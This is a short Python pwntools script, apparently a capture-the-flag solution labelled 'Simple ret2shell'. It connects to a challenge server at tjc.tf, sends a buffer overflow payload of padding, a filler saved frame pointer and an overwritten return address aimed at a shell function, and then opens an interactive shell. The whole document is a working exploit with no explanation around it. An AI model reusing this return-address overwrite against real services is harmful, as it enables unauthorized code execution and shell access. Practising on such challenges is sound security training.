```python
from pwn import *

elf = context.binary = ELF('./chall')
p = remote('tjc.tf', 31680)

addr_shell = 0x40119e
buffer = b"A"*16
rbp = b"B"*8


payload = buffer + rbp + p64(addr_shell)
print(payload)
p.sendline(payload)
p.interactive()
```

Simple ret2shell
